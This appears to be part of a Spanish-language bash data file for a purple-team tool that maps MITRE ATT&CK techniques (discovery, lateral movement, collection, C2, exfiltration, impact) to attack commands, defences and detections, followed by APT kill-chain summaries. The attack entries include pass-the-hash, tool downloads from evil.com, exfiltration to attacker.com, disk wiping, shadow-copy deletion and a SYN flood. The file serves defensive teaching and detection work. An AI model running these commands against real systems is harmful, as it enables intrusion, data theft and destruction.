🔴 ATAQUE — File and Directory Discovery:
  • dir /s /b *.docx (en TARGET)
  • find / -type f -mtime -5 (últimos archivos modificados en TARGET)
|||
🔵 DEFENSA:
  • Principio de mínimo privilegio en NTFS / ext4.
|||
🟣 DETECCIÓN:
  • Alertar sobre crawling recursivo desde el CLI en carpetas de red montadas o perfiles locales ajenos."

PURPLE_DATA["T1057"]="
📝 DESCRIPCIÓN: Enumeración de procesos corriendo para evadir AV o encontrar inyecciones.
|||
🔴 ATAQUE — Process Discovery:
  • tasklist /v (en TARGET)
  • ps aux (en TARGET linux)
  • Get-Process -IncludeUserName
|||
🔵 DEFENSA:
  • Mount del kernel procfs con hidepid en Linux para no ver procesos de otros usuarios.
|||
🟣 DETECCIÓN:
  • Actividad típica pre-exfiltración. Búsqueda de procesos \"AV\" o \"EDR\" vía WMIC o tasklist."

PURPLE_DATA["T1016"]="
📝 DESCRIPCIÓN: Descubrimiento de configuración de Red del Sistema.
|||
🔴 ATAQUE — System Network Configuration:
  • ipconfig /all && arp -a && route print (en TARGET)
  • ifconfig && ip route && netstat -tulnp (en TARGET linux)
|||
🔵 DEFENSA:
  • Zero Trust Network Access (ZTNA) para invisibilizar topología interna.
|||
🟣 DETECCIÓN:
  • Ejecución en cadena de herramientas de red nativas en muy poco tiempo: ipconfig -> arp -> route."

PURPLE_DATA["T1018"]="
📝 DESCRIPCIÓN: Descubrimiento de otros Sistemas Remotos usando el host actual como pivote.
|||
🔴 ATAQUE — Remote System Discovery:
  • net view /all /domain (en TARGET)
  • nmap -sn 192.168.1.0/24 (ping sweep desde TARGET)
  • BloodHound (SharpHound.exe -c All)
|||
🔵 DEFENSA:
  • Deshabilitar NetBIOS y LLMNR.
|||
🟣 DETECCIÓN:
  • Event ID 4661: Peticiones LDAP excesivas.
  • NetFlow: ARP sweeps o ICMP sweeps originados desde un endpoint interno."

# TA0008 - Lateral Movement
PURPLE_DATA["T1550"]="
📝 DESCRIPCIÓN: Movimiento Lateral usando Credenciales robadas, como Pass The Hash (PtH) o Ticket (PtT).
|||
🔴 ATAQUE — Use Alternate Auth Material:
  • pth-winexe -U 'DOMAIN\\admin%aad3b435:HASH' //TARGET cmd.exe
  • Rubeus.exe ptt /ticket:ticket.kirbi (en TARGET hacia un DC)
|||
🔵 DEFENSA:
  • Implementar Windows LAPS para randomizar contraseñas locales (mitiga PtH).
  • Forzar rotación periódica del KRBTGT para invalidar Golden Tickets (PtT).
|||
🟣 DETECCIÓN:
  • Event ID 4624 (Logon Type 9 - NewCredentials).
  • Event ID 4768: TGT con características inusuales o tiempo de vida anómalo."

PURPLE_DATA["T1080"]="
📝 DESCRIPCIÓN: Infección de carpetas compartidas (SMB/DFS) para comprometer otros equipos.
|||
🔴 ATAQUE — Taint Shared Content:
  • Reemplazar un .lnk en la red //TARGET/Compartida/ por uno malicioso.
  • Infectar archivos .exe o inyectar código VBA en .docx alojados allí.
|||
🔵 DEFENSA:
  • NTFS Permissions (ACLs) muy estrictos en File Servers. Solo lectura para grupo General.
|||
🟣 DETECCIÓN:
  • SIEM: Alertar sobre modificación de scripts, .lnk o binarios en recursos compartidos principales."

PURPLE_DATA["T1534"]="
📝 DESCRIPCIÓN: Envío de correos de phishing internos una vez comprometida una cuenta local.
|||
🔴 ATAQUE — Internal Spearphishing:
  • Enviar correo con adjunto malicioso desde juan@empresa.com hacia director@TARGET.com
|||
🔵 DEFENSA:
  • Reglas Anti-Phishing que también filtren el flujo interno-interno de Office 365 / Exchange.
|||
🟣 DETECCIÓN:
  • Envío masivo inusual de correos a listas de distribución internas desde un usuario de bajo nivel."

PURPLE_DATA["T1563"]="
📝 DESCRIPCIÓN: Secuestro de sesiones existentes de SSH/RDP (RDP Hijacking).
|||
🔴 ATAQUE — Remote Session Hijacking:
  • tscon.exe 2 /dest:console (Secuestrar sesión RDP de TARGET como SYSTEM).
  • Robar socket de SSH activo de otro usuario logueado en la misma máquina.
|||
🔵 DEFENSA:
  • Desconectar sesiones RDP inactivas severamente.
  • Limitar el acceso RDP a usuarios simultáneos.
|||
🟣 DETECCIÓN:
  • Event ID 4778: Sesión reconectada. El origen podría no ser el escritorio remoto, sino la propia consola (tscon)."
#!/bin/bash
# Extensión de mitre_data.sh - Parte 3

# TA0009 - Collection
PURPLE_DATA["T1114"]="
📝 DESCRIPCIÓN: Recolección de Correos (PST, OST, Webmail).
|||
🔴 ATAQUE — Email Collection:
  • Grab_PST.ps1 o ninja.exe descargando Outlook logs en TARGET.
  • Delegación masiva en Exchange hacia cuenta comprometida.
|||
🔵 DEFENSA:
  • Cifrado robusto en repositorios de correo in-transit y at-rest.
|||
🟣 DETECCIÓN:
  • Reglas de Exchange: Alerta por 'Mailbox Export Request' o por creación de forwarding a dominios externos."

PURPLE_DATA["T1005"]="
📝 DESCRIPCIÓN: Recolección de Datos desde el Sistema Local (Documentos, Bases de Datos locales).
|||
🔴 ATAQUE — Data from Local System:
  • find / -name \"*.pdf\" -o -name \"*.docx\" -exec cp {} /tmp/loot/ \\; (TARGET_LINUX)
  • robocopy /S C:\\Users\\* C:\\Windows\\Temp\\loot *.docx *.xlsx (TARGET_WIN)
|||
🔵 DEFENSA:
  • Cifrado BitLocker/FileVault. Restringir acceso al disco local entero por parte de apps (EFS).
|||
🟣 DETECCIÓN:
  • FIM: Actividad masiva de lectura y copiado de un árbol completo de documentos por un proceso inusual."

PURPLE_DATA["T1039"]="
📝 DESCRIPCIÓN: Exfiltración de un Recurso Compartido de Red.
|||
🔴 ATAQUE — Data from Network Shared Drive:
  • smbclient //TARGET/Finance -U user%pass -c \"recurse; mget *\"
|||
🔵 DEFENSA:
  • Monitoreo de acceso y auditorías en FileServer y Sharepoint.
|||
🟣 DETECCIÓN:
  • Event ID 5145: Acceso hiper detallado al recurso compartido. Volumen inusual de Bytes leídos."

PURPLE_DATA["T1113"]="
📝 DESCRIPCIÓN: Captura de pantalla para ver qué hace el usuario o qué tiene en memoria.
|||
🔴 ATAQUE — Screen Capture:
  • meterpreter > screenshare (en TARGET)
  • Invoke-Specter -Screenshot (PowerSploit)
|||
🔵 DEFENSA:
  • EDR mitigando inyección en procesos de Windows Manager (dwm.exe).
|||
🟣 DETECCIÓN:
  • Llamadas excesivas a las APIs BitBlt, GetDC, o PrintWindow en un bucle temporal."

# TA0011 - Command and Control (C2)
PURPLE_DATA["T1071"]="
📝 DESCRIPCIÓN: C2 sobre Protocolo de Capa de Aplicación (HTTP, HTTPS, DNS, SMTP).
|||
🔴 ATAQUE — Application Layer Protocol:
  • Cobalt Strike Beacon conectando vía HTTPS a C2 (vía TARGET).
  • dnscat2 u iodine tunnel sobre DNS.
|||
🔵 DEFENSA:
  • Terminar SSL/TLS en proxy corporativo (SSL Decryption) para inspección.
|||
🟣 DETECCIÓN:
  • Alerta en balizas HTTPS: Beacons con longitud constante, intervalos predecibles (jitter) o User-Agents inusuales (Python-urllib)."

PURPLE_DATA["T1095"]="
📝 DESCRIPCIÓN: Protocolos no estándar (UDP, ICMP o RAW sockets) para bypass.
|||
🔴 ATAQUE — Non-Application Layer Protocol:
  • icmptunnel para llevar paquetes IP ocultos en ping echo/reply hacia/desde TARGET.
|||
🔵 DEFENSA:
  • Filtrar ICMP saliente, y restringir reglas perimetrales.
|||
🟣 DETECCIÓN:
  • NetFlow: Payload desproporcionadamente largo en paquetes ICMP."

PURPLE_DATA["T1572"]="
📝 DESCRIPCIÓN: Protocol Tunneling (SSH sobre HTTPS, tunelización profunda).
|||
🔴 ATAQUE — Protocol Tunneling:
  • Chisel server en ATTACKER, chisel client en TARGET (ssh -R).
  • ligolo-ng para routing interno inverso total.
|||
🔵 DEFENSA:
  • Strict Proxy y segmentación.
|||
🟣 DETECCIÓN:
  • Proxy Logs: Flujo binario oscuro en protocolo WebSockets o TLS que no es HTTP válido."

PURPLE_DATA["T1090"]="
📝 DESCRIPCIÓN: Conexión C2 usando proxies o infraestructura pivot para ofuscar el origen real.
|||
🔴 ATAQUE — Proxy:
  • Proxychains enlazando saltos internos de TARGET hacia Internet a través de un nodo SOCKS5.
|||
🔵 DEFENSA:
  • Whitelist estricta de puertos Proxy internos.
|||
🟣 DETECCIÓN:
  • NetFlow: Conexiones de un Server Web DMZ abriendo sockets contra Active Directory Interno."

PURPLE_DATA["T1105"]="
📝 DESCRIPCIÓN: Transferencia de herramientas (Malware, Utils) hacia el origen de recolección.
|||
🔴 ATAQUE — Ingress Tool Transfer:
  • wget http://evil.com/linpeas.sh -O /tmp/lp.sh (TARGET_LINUX)
  • curl.exe -o C:\\Temp\\mimikatz.exe http://evil.com/mz.exe (TARGET_WIN)
|||
🔵 DEFENSA:
  • Bloquear dominios newly registered (NRDs), dominios maliciosos conocidos, e IP sin dominio en el Firewall.
|||
🟣 DETECCIÓN:
  • Proxy Logs: 'curl', 'wget', 'certutil' descargarndo arhivos .exe, .sh, .ps1, .dll."

# TA0010 - Exfiltration
PURPLE_DATA["T1048"]="
📝 DESCRIPCIÓN: Exfiltración sobre Protocolo Alternativo (Ej. FTP, SSH out, ICMP out).
|||
🔴 ATAQUE — Exfil Over Alternative Protocol:
  • scp /tmp/loot.zip root@attacker.com:/var/www/html (desde TARGET)
  • ping -p [HEX_DATA] attacker.com
|||
🔵 DEFENSA:
  • Data Loss Prevention (DLP) para interceptar movimientos masivos fuera de la red.
|||
🟣 DETECCIÓN:
  • Firewalls perimetrales detectando tráfico FTP/SSH saliente desde subnet no autorizada."

PURPLE_DATA["T1041"]="
📝 DESCRIPCIÓN: Exfiltración sobre el mismo canal de Comando y Control establecido (C2).
|||
🔴 ATAQUE — Exfiltration Over C2 Channel:
  • download C:\\Users\\Boss\\Passwords.kdbx (en consola Cobalt/Meterpreter en TARGET).
|||
🔵 DEFENSA:
  • Limitar el ancho de banda y tamaño de sesión para hosts que no necesiten subir data externa.
|||
🟣 DETECCIÓN:
  • Alertas de UEBA: Múltiples gigabytes exfiltrados en una conexión HTTPS asimétrica (mucho upload, poco download)."

PURPLE_DATA["T1567"]="
📝 DESCRIPCIÓN: Uso de servicios web válidos (GitHub, Google Drive, Mega) para exfiltrar y evadir bloqueos de dominios.
|||
🔴 ATAQUE — Exfiltration Over Web Service:
  • Rclone subiendo datos de TARGET hacia una cuenta de Mega o AWS S3 externa.
|||
🔵 DEFENSA:
  • CASB (Cloud Access Security Broker) bloqueando acceso a tenants no corporativos.
|||
🟣 DETECCIÓN:
  • Proxy Logs: Conexiones anómalas por volumen subido hacia Mega o subdominios no oficiales de O365."

PURPLE_DATA["T1020"]="
📝 DESCRIPCIÓN: Exfiltración Automatizada.
|||
🔴 ATAQUE — Automated Exfiltration:
  • Script en bash cronificado que empaqueta tar.gz y hace curl -F a un Webhook cada noche en TARGET.
|||
🔵 DEFENSA:
  • Filtrado de contenido/DLP que detecte formato comprimido opaco con firmas mágicas.
|||
🟣 DETECCIÓN:
  • Patrón periódico y rítmico (Jitter bajo) en los Firewall de salida."

# TA0040 - Impact
PURPLE_DATA["T1485"]="
📝 DESCRIPCIÓN: Destrucción de datos para interrumpir su disponibilidad, usando herramientas de Wipe/Shred.
|||
🔴 ATAQUE — Data Destruction:
  • sudo shred -zvu -n 3 /* (Destrucción total en TARGET Linux)
  • sdelete.exe -p 5 -s C:\\* (Destrucción en TARGET Win)
|||
🔵 DEFENSA:
  • Backups inmutables y offline regulares. Plan DRP probado y verificado.
|||
🟣 DETECCIÓN:
  • I/O Disk altísimo detectado por monitoreo (Zabbix/Prometheus).
  • Alertas de EDR por binarios como Sysinternals SDelete usados masivamente."

PURPLE_DATA["T1486"]="
📝 DESCRIPCIÓN: Cifrar datos por Impacto (Ransomware).
|||
🔴 ATAQUE — Data Encrypted for Impact:
  • LockBit/WannaCry payloads ejecutados en masa vía GPO en el DC hacia todos los TARGETs.
|||
🔵 DEFENSA:
  • Segmentar red plana, LAPS, desactivar privilegios de dominios locales, backups out-of-band.
|||
🟣 DETECCIÓN:
  • File Server Resource Manager (FSRM) bloqueando extensiones de ransomware conocidas.
  • Honeypots (archivos trampa): si se cifran o modifican, aísla el host automáticamente."

PURPLE_DATA["T1490"]="
📝 DESCRIPCIÓN: Inhibir la recuperación del SO borrando Shadow Copies o Boot Records.
|||
🔴 ATAQUE — Inhibit System Recovery:
  • vssadmin.exe Delete Shadows /All /Quiet (en TARGET)
  • bcdedit /set {default} recoveryenabled No
  • wmic shadowcopy delete
|||
🔵 DEFENSA:
  • Tamper protection previniendo alteración en vssadmin.
|||
🟣 DETECCIÓN:
  • Sysmon/EDR: Ejecución de vssadmin y bcdedit alertando de forma crítica e inmediata."

PURPLE_DATA["T1498"]="
📝 DESCRIPCIÓN: Denegación de servicio en red.
|||
🔴 ATAQUE — Network Denial of Service:
  • hping3 --flood -S -p 80 TARGET
  • Amplificación NTP/DNS contra las IPs de la empresa externa.
|||
🔵 DEFENSA:
  • Servicios Anti-DDoS (Cloudflare, Akamai).
|||
🟣 DETECCIÓN:
  • Alerta volumétrica proveniente del NOC / WAF / ISP."

PURPLE_DATA["T1496"]="
📝 DESCRIPCIÓN: Cryptojacking. Secuestro de recursos (CPU/GPU) para minado de criptomonedas.
|||
🔴 ATAQUE — Resource Hijacking:
  • XMRig minero desplegado como servicio oculto csrss_update.exe en TARGET.
|||
🔵 DEFENSA:
  • Monitoreo de Host: Umbrales de CPU en >95% continuos alertan al SOC.
|||
🟣 DETECCIÓN:
  • Conexiones a pools de minería conocidos bloqueados o detectados por proxy."


# ==========================================================
# ACTUALIZACIÓN DE APT KILLCHAIN PARA USAR TARGET
# ==========================================================

APT_KILLCHAIN["APT29"]="1.(Reconocimiento) Enviar Spear Phishing con .LNK / adjunto Office a empleados de TARGET|2.(Ejecución) Ejecutar PowerShell obfuscado (T1059) al hacer clic|3.(C2) Backdoor SUNBURST/WellMess instalado en memoria en TARGET (T1055)|4.(Descubrimiento) BloodHound lanzado para mapeo interno desde TARGET (T1018)|5.(Movimiento Lateral) Pivote vía RDP / WMI a otros servidores|6.(Credenciales) Kerberoasting contra Controladores de Dominio de TARGET (T1558)|7.(Exfiltración) Robo de emails O365 corporativos y exfiltración HTTP a C2 (T1041)|8.(Evasión) Limpieza de logs (T1070) con persistencia DCOM oculta (T1505)"

APT_KILLCHAIN["APT38"]="1.(Acceso Inicial) Enviar Spear Phishing con oportunidad laboral a sysadmin de TARGET|2.(Ejecución) Dropper BLINDINGCAN ejecutado en TARGET (T1059)|3.(Descubrimiento) Scaneo silencioso (T1046) del entorno financiero (SWIFT) de TARGET|4.(Escalada) Explotación LPE y volcado de LSASS en servidor de transacciones|5.(C2) HOPLIGHT o FALLCHILL instalado con HTTP C2 proxyizado (T1090) hacia RPDC|6.(Impacto/Exfil) Transferencias monetarias fraudulentas emitidas por TARGET (T1565)|7.(Impacto/Destrucción) DESTOVER wiper borra el Boot Record de TARGET (T1485) para destruir evidencias|8.(Defensa) Lavado de fondos mediante Tumblers Cripto externos"

APT_KILLCHAIN["FIN7"]="1.(Acceso Inicial) Ataque físico (USB rubber ducky) o Phishing a POS Retailer en TARGET filial|2.(Ejecución) BABYMETAL/BIRDWATCH backdoor implementado (PowerShell T1059)|3.(C2) Carbanak / DICELOADER habilitando red C2 en TARGET|4.(Movimiento) Expansión hacia las Terminales de Punto de Venta (POS)|5.(Credenciales) Inyección de Keylogger (T1056) en procesos de pago de tarjetas en TARGET|6.(Recolección) Extracción de Track1/Track2 MSR vía DNS exfil|7.(Impacto) Despliegue de ransomware ALPHV/BlackCat (T1486) como cortina de humo destructiva|8.(Exfil) Datos y archivos internos robados puestos a la venta en DarkWeb por FIN7"
